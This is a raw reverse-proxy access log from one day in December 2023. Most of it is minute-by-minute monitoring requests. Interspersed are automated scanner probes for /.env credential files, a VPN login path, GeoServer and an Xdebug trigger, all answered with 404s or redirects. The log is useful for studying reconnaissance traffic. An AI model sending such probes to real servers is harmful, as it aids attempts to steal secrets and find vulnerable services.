159.203.109.206 - - [15/Dec/2023:13:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 971 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 972 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:13:26:17 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 973 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:13:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 974 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 975 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 976 "www@docker" "http://172.28.0.10:80" 1ms
64.62.197.31 - - [15/Dec/2023:13:27:28 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 977 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:13:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 978 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 979 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 980 "www@docker" "http://172.28.0.10:80" 1ms
64.62.197.18 - - [15/Dec/2023:13:28:52 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 981 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:13:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 982 "www@docker" "http://172.28.0.10:80" 0ms
64.62.197.26 - - [15/Dec/2023:13:29:28 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 983 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:13:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 984 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:13:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 985 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 986 "www@docker" "http://172.28.0.10:80" 1ms
64.62.197.30 - - [15/Dec/2023:13:31:19 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 987 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:13:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 988 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:13:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 989 "www@docker" "http://172.28.0.10:80" 1ms
64.62.197.25 - - [15/Dec/2023:13:31:39 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 990 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:13:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 991 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 992 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 993 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 994 "www@docker" "http://172.28.0.10:80" 0ms
64.62.197.31 - - [15/Dec/2023:13:34:23 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 995 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:13:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 996 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 997 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 998 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 999 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1000 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1001 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1002 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1003 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1004 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1005 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1006 "www@docker" "http://172.28.0.10:80" 1ms
143.198.143.69 - - [15/Dec/2023:13:39:28 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1007 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:13:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1008 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1009 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1010 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1011 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1012 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1013 "www@docker" "http://172.28.0.10:80" 9ms
167.71.120.76 - - [15/Dec/2023:13:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1014 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1015 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1016 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1017 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1018 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1019 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1020 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1021 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1022 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1023 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1024 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1025 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1026 "www@docker" "http://172.28.0.10:80" 0ms
64.62.197.100 - - [15/Dec/2023:13:48:43 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1027 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:13:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1028 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1029 "www@docker" "http://172.28.0.10:80" 1ms
64.62.197.92 - - [15/Dec/2023:13:50:15 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 1030 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:13:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1031 "www@docker" "http://172.28.0.10:80" 1ms
64.62.197.96 - - [15/Dec/2023:13:50:23 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 1032 "-" "-" 0ms
64.62.197.100 - - [15/Dec/2023:13:50:28 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1033 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:13:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1034 "www@docker" "http://172.28.0.10:80" 1ms
64.62.197.96 - - [15/Dec/2023:13:50:46 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 1035 "-" "-" 0ms
64.62.197.105 - - [15/Dec/2023:13:50:52 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 1036 "-" "-" 0ms
64.62.197.105 - - [15/Dec/2023:13:51:06 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 1037 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:13:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1038 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1039 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1040 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1041 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1042 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:13:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1043 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1044 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1045 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:13:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1046 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1047 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1048 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1049 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:13:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1050 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1051 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:13:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1052 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1053 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:13:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1054 "www@docker" "http://172.28.0.10:80" 1ms
83.97.73.87 - - [15/Dec/2023:13:59:31 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 19 "-" "-" 1055 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:13:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1056 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1057 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1058 "www@docker" "http://172.28.0.10:80" 1ms
83.97.73.87 - - [15/Dec/2023:14:00:53 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 19 "-" "-" 1059 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:14:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1060 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1061 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1062 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1063 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1064 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:14:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1065 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1066 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1067 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1068 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1069 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1070 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1071 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:14:06:58 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1072 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:14:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1073 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1074 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1075 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1076 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1077 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:14:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1078 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1079 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1080 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1081 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1082 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:14:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1083 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1084 "www@docker" "http://172.28.0.10:80" 0ms
179.43.161.130 - - [15/Dec/2023:14:12:59 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1085 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:14:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1086 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1087 "www@docker" "http://172.28.0.10:80" 0ms
65.49.20.69 - - [15/Dec/2023:14:13:48 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1088 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:14:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1089 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1090 "www@docker" "http://172.28.0.10:80" 0ms
167.94.145.51 - - [15/Dec/2023:14:15:08 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1091 "web-to-websecure@internal" "-" 0ms
167.94.145.51 - - [15/Dec/2023:14:15:12 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1092 "web-to-websecure@internal" "-" 0ms
167.94.145.51 - - [15/Dec/2023:14:15:18 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1093 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:14:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1094 "www@docker" "http://172.28.0.10:80" 0ms
65.49.20.69 - - [15/Dec/2023:14:15:26 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1095 "web-to-websecure@internal" "-" 0ms
65.49.20.69 - - [15/Dec/2023:14:15:26 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1096 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:14:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1097 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1098 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1099 "www@docker" "http://172.28.0.10:80" 1ms
65.49.20.69 - - [15/Dec/2023:14:17:03 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 1100 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:14:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1101 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1102 "www@docker" "http://172.28.0.10:80" 1ms
65.49.20.69 - - [15/Dec/2023:14:18:02 +0000] "GET /geoserver/web/ HTTP/1.1" 301 17 "-" "-" 1103 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:14:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1104 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:14:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1105 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1106 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:14:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1107 "www@docker" "http://172.28.0.10:80" 0ms
143.110.222.166 - - [15/Dec/2023:14:20:10 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1108 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:14:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1109 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1110 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1111 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1112 "www@docker" "http://172.28.0.10:80" 1ms
95.214.235.169 - - [15/Dec/2023:14:22:06 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1113 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [15/Dec/2023:14:22:06 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1114 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:14:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1115 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:14:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1116 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:14:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1117 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:14:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1118 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1119 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:14:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1120 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1121 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1122 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:14:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1123 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:14:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1124 "www@docker" "http://172.28.0.10:80" 0ms
54.36.115.221 - - [15/Dec/2023:14:26:39 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1125 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [15/Dec/2023:14:26:40 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1126 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:14:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1127 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1128 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:14:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1129 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1130 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:14:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1131 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1132 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1133 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1134 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1135 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1136 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1137 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1138 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1139 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1140 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:14:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1141 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:14:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1142 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:14:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1143 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1144 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1145 "www@docker" "http://172.28.0.10:80" 1ms
179.43.161.130 - - [15/Dec/2023:14:36:34 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1146 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:14:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1147 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:14:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1148 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1149 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1150 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:14:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1151 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1152 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1153 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1154 "www@docker" "http://172.28.0.10:80" 1ms
